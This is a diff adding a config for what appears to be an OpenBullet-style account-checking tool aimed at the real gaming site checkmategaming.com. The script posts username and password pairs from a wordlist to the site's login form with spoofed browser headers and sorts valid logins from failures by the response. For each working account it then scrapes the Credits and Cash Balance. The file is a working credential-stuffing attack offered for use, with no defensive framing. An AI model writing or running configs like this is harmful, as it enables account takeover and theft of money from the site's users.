@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "checkmategaming",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-06T23:36:23.2029059+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.checkmategaming.com/login" AutoRedirect=TRUE 
+  CONTENT "login%5Bname%5D=<USER>&login%5Bpass%5D=<PASS>&act=setlogin" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.checkmategaming.com/login" 
+  HEADER "origin: https://www.checkmategaming.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Sorry, invalid login information. The username and/or password you entered is incorrect, please try again.</" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "520" 
+#CHECK REQUEST GET "https://www.checkmategaming.com/?login=true" AutoRedirect=TRUE 
+  CONTENT "login=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "referer: https://www.checkmategaming.com/login" 
+PARSE "<SOURCE>" LR "/\">(" ") Credits" Recursive=FALSE -> CAP "CREDITS" "" "" 
+PARSE "<SOURCE>" LR "\">Cash Balance: " "</a></li>" Recursive=FALSE -> CAP "CASHBALANCE" "" "" 
